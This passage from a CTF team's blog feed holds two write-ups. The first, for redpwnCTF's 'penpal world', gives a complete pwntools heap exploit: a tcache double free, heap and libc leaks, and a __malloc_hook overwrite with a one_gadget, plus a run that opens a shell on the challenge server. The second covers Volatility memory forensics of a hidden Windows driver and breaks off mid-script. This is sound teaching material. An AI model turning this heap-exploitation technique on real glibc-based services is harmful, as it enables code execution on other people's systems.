unsortedbin</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK LIBC</span></span><br><span class="line">l =  u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure><p>Lets see how this looks in GDB, this is the look of tcache bins(0x90) after the 7 frees:<br><a data-fancybox="gallery" href="https://i.imgur.com/ropfJc7.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ropfJc7.png" alt><br></a></p><p>Now the 8th free which is the unsorted bin:<br><a data-fancybox="gallery" href="https://i.imgur.com/d0JaLL7.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/d0JaLL7.png" alt><br></a></p><h3 id="Overwrite-malloc-hook-with-the-address-of-a-one-gadget"><a href="#Overwrite-malloc-hook-with-the-address-of-a-one-gadget" class="headerlink" title="Overwrite __malloc_hook with the address of a one gadget"></a>Overwrite __malloc_hook with the address of a one gadget</h3><p>Malloc hook executes with malloc (it’s used for debugging) initially is set to 0x0 , using <strong>TCACHE POISONING</strong> we can overwrite its address with the address of <strong>onegadget</strong>. Getting a free shell after triggering malloc.</p><p>Getting the onegadget offset using <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">https://github.com/david942j/one_gadget</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">one_gadget libc-2.27.so </span><br><span class="line">0x4f2c5 execve(<span class="string">"/bin/sh"</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(<span class="string">"/bin/sh"</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>The offset that works with the restriction is 0x10a38c.<br>Making malloc to return the address of <strong>__malloc_hook</strong> and overwriting it with onegadget:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LIBC_BASE = l<span class="number">-0x3ebca0</span></span><br><span class="line">MALLOC_HOOK = LIBC_BASE+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">FREE_HOOK = LIBC_BASE+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">ONE_GADGET = LIBC_BASE+<span class="number">0x10a38c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment">################################### OVERWRITE MALLOC_HOOK</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(MALLOC_HOOK)) <span class="comment"># change the address of FD to MALLOC_HOOK</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># returns the address of malloc_hook</span></span><br><span class="line">edit(<span class="number">0</span>,p64(ONE_GADGET)) <span class="comment"># Overwrites content of malloc_hook to ONE_GADGET</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># trigers malloc hook</span></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>The full exploit:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host, port = <span class="string">"chall2.2019.redpwn.net"</span>, <span class="string">"4010"</span></span><br><span class="line">filename = <span class="string">"./penpal_world"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF('/glibc/2.27/64/lib/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc<span class="comment">#ELF('/glibc/2.27/64/lib/libc-2.27.so')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"><span class="comment">#rop=ROP([libc])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    <span class="comment">#bp = [0xea0,0xd31,0xc52]</span></span><br><span class="line">    <span class="comment">#bp = [0x00000dfb,0x00000b7c,0x00000d10]</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">1</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    <span class="comment">#r.sendlineafter()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">2</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    r.sendafter(<span class="string">'Write.\n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">3</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    <span class="comment">#r.recvuntil('Command me: ')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">4</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">debug([<span class="number">0xb11</span>,<span class="number">0x9b3</span>])<span class="comment">#0xb11,0x9b3]) #0x9b3 0xB11 0xa7c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################### LEAK FUCKING LIBC</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x60</span></span><br><span class="line">log.info(<span class="string">'0x%x'</span>%heap)</span><br><span class="line">log.info(<span class="string">'0x%x'</span>%(heap+<span class="number">0x100</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x90</span>)) <span class="comment"># change the fd pointer to get arbitrary write with malloc</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># MALLOC RETURNS heap+0x60 tchachebin(0x50): heap+0x60 -&gt; heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># MALLOC RETURNS heap+0x90 tchachebin(0x50): heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># NEW ALLOCATION (NO MEMORY REUSE) THIS ONE IS DONE HERE TO PREVENT MERGE WITH TOP CHUNK</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'B'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)) <span class="comment"># OVERWRITES THE SIZE OF CHUNK 'B'</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># TO PREVENT FREE ERRORS WHEN FREEING AN UNSORTED BIN</span></span><br><span class="line">edit(<span class="number">1</span>,(<span class="string">'C'</span>*<span class="number">0x30</span> +p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>)))</span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># TO PREVENT FREE ERRORS WHEN FREEING AN UNSORTED BIN</span></span><br><span class="line">edit(<span class="number">1</span>, (<span class="string">'D'</span>*<span class="number">0x30</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment"># Filling tcachebin</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># free unsortedbin</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK LIBC</span></span><br><span class="line">l =  u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#log.info(hex(rop.search(regs=['rdi'], order = 'regs').address))</span></span><br><span class="line">LIBC_BASE = l<span class="number">-0x3ebca0</span></span><br><span class="line">MALLOC_HOOK = LIBC_BASE+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">FREE_HOOK = LIBC_BASE+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">SYSTEM = LIBC_BASE+ libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">BINSH = LIBC_BASE+ libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">ONE_GADGET = LIBC_BASE+<span class="number">0x10a38c</span></span><br><span class="line">POPRDI = LIBC_BASE+<span class="number">0x2155f</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"MAIN ARENA+0x96 0x%x"</span>%l)</span><br><span class="line">log.info(<span class="string">"LIBCBASE 0x%x"</span>%LIBC_BASE)</span><br><span class="line">log.info(<span class="string">"ONEGADGET 0x%x"</span>%ONE_GADGET)</span><br><span class="line">log.info(<span class="string">"MALLOC HOOK 0x%x"</span>%MALLOC_HOOK)</span><br><span class="line">log.info(<span class="string">"FREE HOOK 0x%x"</span>%FREE_HOOK)</span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span>%SYSTEM)</span><br><span class="line">log.info(<span class="string">"BIN_SH 0x%x"</span>%BINSH)</span><br><span class="line">log.info(<span class="string">"POP RDI 0x%x"</span>%POPRDI)</span><br><span class="line">log.info(<span class="string">"JUMP 0x%x"</span>%(heap+<span class="number">0x150</span>))<span class="comment">#0x1d8b6b0))</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"HEAP 0x%x"</span>%(heap)) <span class="comment">#24</span></span><br><span class="line">log.info(<span class="string">"NEXT HEAP 0x%x"</span>%(heap+<span class="number">0x130</span>))</span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment">################################### OVERWRITE MALLOC_HOOK</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(MALLOC_HOOK)) <span class="comment"># change the address of FD to MALLOC_HOOK</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># returns the address of malloc_hook</span></span><br><span class="line">edit(<span class="number">0</span>,p64(ONE_GADGET)) <span class="comment"># Overwrites content of malloc_hook to ONE_GADGET</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># trigers malloc hook</span></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><p>Running it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ root@redpwn:/ctf/work/pwn/pepal_world<span class="comment"># python penpal_world.py REMOTE</span></span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/pepal_world/penpal_world'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/pepal_world/libc-2.27.so'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to chall2.2019.redpwn.net on port 4010: Done</span><br><span class="line">[*] 0x561de3031200</span><br><span class="line">[*] 0x561de3031300</span><br><span class="line">[*] MAIN ARENA+0x96 0x7f79a7fe2ca0</span><br><span class="line">[*] LIBCBASE 0x7f79a7bf7000</span><br><span class="line">[*] ONEGADGET 0x7f79a7d0138c</span><br><span class="line">[*] MALLOC HOOK 0x7f79a7fe2c30</span><br><span class="line">[*] FREE HOOK 0x7f79a7fe48e8</span><br><span class="line">[*] SYSTEM 0x7f79a7c46440</span><br><span class="line">[*] BIN_SH 0x7f79a7daae9a</span><br><span class="line">[*] POP RDI 0x7f79a7c1855f</span><br><span class="line">[*] JUMP 0x561de3031350</span><br><span class="line">[*] HEAP 0x561de3031200</span><br><span class="line">[*] NEXT HEAP 0x561de3031330</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag.txt</span><br><span class="line">flag&#123;0h_n0e5_sW1p3r_d1D_5w!peEEeE&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;penpal world&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;436&lt;/p&gt;
&lt;p&gt;Written by: jespiron&lt;/p&gt;
&lt;p&gt;Pleas
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Tcache" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/"/>
    
      <category term="tcache_dup" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-dup/"/>
    
      <category term="tcache_poisoning" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-poisoning/"/>
    
    
      <category term="redpwnctf2017" scheme="https://teamrocketist.github.io/tags/redpwnctf2017/"/>
    
      <category term="heap" scheme="https://teamrocketist.github.io/tags/heap/"/>
    
      <category term="double_free" scheme="https://teamrocketist.github.io/tags/double-free/"/>
    
      <category term="tcache_poisoning" scheme="https://teamrocketist.github.io/tags/tcache-poisoning/"/>
    
      <category term="use_after_free" scheme="https://teamrocketist.github.io/tags/use-after-free/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] CyBRICS CTF Quals 2019 - Hidden Flag</title>
    <link href="https://teamrocketist.github.io/2019/07/27/Reverse-CyBRICS-CTF-Quals-2019-Hidden-Flag/"/>
    <id>https://teamrocketist.github.io/2019/07/27/Reverse-CyBRICS-CTF-Quals-2019-Hidden-Flag/</id>
    <published>2019-07-27T15:31:43.000Z</published>
    <updated>2019-07-27T18:21:15.621Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Hidden Flag 220</p></blockquote><blockquote><p><strong>Description</strong>:<br>Hidden Flag (Reverse, Hard, 220 pts) Author: Khanov Artur (awengar)<br>Somebody hides flag in RAM. Catch it<br>Raw dump: <a href="https://cybrics.net/files/20190717.zip.torrent" target="_blank" rel="noopener">https://cybrics.net/files/20190717.zip.torrent</a></p></blockquote><p>I didn’t solve this challenge during the ctf, one of the main reasons was because the challenge was a mix of a <strong>forensics/reverse</strong>, I got stuck on the forensics part, mostly because I don’t have much experience looking at memory dumps, the reversing part was pretty easy after finding the “malicious” binary. </p><h3 id="Forensics-part"><a href="#Forensics-part" class="headerlink" title="Forensics part"></a>Forensics part</h3><p>So we start with a <strong>memdump</strong> and we somehow need to find the flag in memory, I used <a href="https://www.volatilityfoundation.org/" target="_blank" rel="noopener">volatility</a> for this part. The first thing we have to do is to find the most suitable <strong>profile</strong> for the dump, volatility has a command named <strong>imageinfo</strong> which can help us with that:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ volatility -f 20190717.mem imageinfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win2016x64_14393, Win10x64_14393, Win10x64_16299, Win10x64_17134, Win10x64_15063</span><br><span class="line">                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/home/fucker/Downloads/volq/20190717.mem)</span><br><span class="line">                      PAE <span class="built_in">type</span> : No PAE</span><br><span class="line">                           DTB : 0x1ad002L</span><br><span class="line">                          KDBG : 0xf8005b5a3520L</span><br><span class="line">          Number of Processors : 2</span><br><span class="line">     Image Type (Service Pack) : 0</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0xfffff8005a4ee000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 1 : 0xffff800121420000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2019-07-17 23:48:54 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> date and time : 2019-07-17 16:48:54 -0700</span><br></pre></td></tr></table></figure><p>Volatility suggests 5 profiles, <strong>Win10x64_17134</strong> is the most updated so I opted to use that one. This is the part where I got stuck I kept insisting on looking only at processes during the ctf, I used comands like <strong>pslist</strong>, <strong>psxview</strong> etc and I found some interesting processes that weren’t listed in <strong>pslist</strong> :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ volatility -f 20190717.mem --profile Win10x64_17134 psxview</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Offset(P)          Name                    PID pslist psscan thrdproc pspcid csrss sessiodn deskthrd ExitTime</span><br><span class="line">------------------ -------------------- ------ ------ ------ -------- ------ ----- ------- -------- --------</span><br><span class="line">... truncated ...</span><br><span class="line">0x000000002736c580 dllhost.exe            5024 False  True   True     False  True  False   True    </span><br><span class="line">... truncated ...</span><br><span class="line">0x0000000070b46a20                      32...2 False  False  False    False  False False   True    </span><br><span class="line">... truncate ...</span><br><span class="line">0x000000001ff17580 dllhost.exe             240 False  True   True     False  False False   False</span><br></pre></td></tr></table></figure><p>As you can see this 3 processes are not shown in <strong>pslist</strong> one of them doesn’t even have a name or a valid PID, I tried to dump the memory of this 3 but I was not able to do it, for some reason volatility was spiting errors, I also dumped part of the registry too trying to find something useful but that also failed.<br>Much later I decided to view the list of kernel drivers loaded on the system, for this I used the <strong>modules</strong> command. This command walks the doubly-linked list of <strong>LDR_DATA_TABLE_ENTRY</strong> structures pointed to <strong>PsLoadedModuleList</strong>. However this cannot find hidden/unlinked kernel drivers but if this doesn’t work we can also try to do a <strong>modscan</strong> which serves that purpose.</p><p>The output of the <strong>modules</strong> command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 20190717.mem --profile Win10x64_17134 modules</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Offset(V)          Name                 Base                             Size File</span><br><span class="line">------------------ -------------------- ------------------ ------------------ ----</span><br><span class="line">... truncated...</span><br><span class="line">0xffffd88ec1e8e010 vmhgfs.sys           0xfffff8005da80000            0x2b000 \SystemRoot\system32\DRIVERS\vmhgfs.sys</span><br><span class="line">0xffffd88ec1fdd8c0 condrv.sys           0xfffff8005dab0000            0x12000 \SystemRoot\System32\drivers\condrv.sys</span><br><span class="line">0xffffd88ec45fb240 WdNisDrv.sys         0xfffff8005dad0000            0x12000 \SystemRoot\system32\drivers\wd\WdNisDrv.sys</span><br><span class="line">0xffffd88eda5c83d0 Flagostor.sys        0xfffff8005daf0000             0x7000 \??\C:\t4est\Flagostor.sys</span><br><span class="line">0xffffd88ec2981480 RamCaptur...er64.SYS 0xfffff8005db00000             0x7000 \??\C:\Users\<span class="built_in">test</span>\Desktop\RamCapturer\x64\RamCaptureDriver64.SYS</span><br></pre></td></tr></table></figure><p>We didn’t even ran <strong>modscan</strong> and we already find two weird drivers that are loaded directly from a strange path <strong>C:\t4est</strong> and <strong>C:\test</strong>, this isn’t normal, the normal thing to happen is to be loaded from the <strong>system32</strong> folder… Obviously <strong>RamCaptureDriver64.sys</strong> is probably what the creator used to dump this memory, so we are left with <strong>flagostor.sys</strong> which already has a weird name and also hints for <strong>flag</strong> after this I used <strong>moddump</strong> to extract this <strong>driver</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ volatility -f 20190717.mem --profile Win10x64_17134 moddump -b 0xfffff8005daf0000 -D .</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Module Base        Module Name          Result</span><br><span class="line">------------------ -------------------- ------</span><br><span class="line">0xfffff8005daf0000 Flagostor.sys        OK: driver.fffff8005daf0000.sys</span><br></pre></td></tr></table></figure><p>Checking what kind of file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file driver.fffff8005daf0000.sys</span><br><span class="line">driver.fffff8005daf0000.sys: PE32+ executable (native) x86-64, <span class="keyword">for</span> MS Windows</span><br></pre></td></tr></table></figure><p>And this is it, the forensics part is over lets go for the reversing part.</p><h3 id="Reversing-part"><a href="#Reversing-part" class="headerlink" title="Reversing part"></a>Reversing part</h3><p>We have now a <strong>PE executable</strong>, I used both <strong>IDA</strong> and <strong>Ghidra</strong>, this time <strong>Ghidra</strong> actually helped me decoding the final part of the decryption function (Pseudo c code was somehow presented better than ida at least from my perspective). I first started analysing with IDA, the main function <strong>sub_FFFFF8005DAF1000</strong> which I renamed later to printLoader in the picture below:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/fui7DWT.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/fui7DWT.png" alt><br></a></p><p>So lets check the next function:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/Lwy2i7u.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Lwy2i7u.png" alt><br></a></p><p>Dumping the global variable (Double click on <strong>unk_FFFFF8005DAF3000</strong>):</p><p><a data-fancybox="gallery" href="https://i.imgur.com/LNYKKCK.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/LNYKKCK.png" alt><br></a></p><p>Analysing <strong>sub_FFFFF8005DAF1440</strong>: </p><p><a data-fancybox="gallery" href="https://i.imgur.com/eiu2ZQq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/eiu2ZQq.png" alt><br></a></p><p>Since we can convert assembly to pseudo code c in <strong>IDA</strong> we can easily convert this function into python:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/JIeBOdI.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/JIeBOdI.png" alt><br></a></p><p>Creating a python script for this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 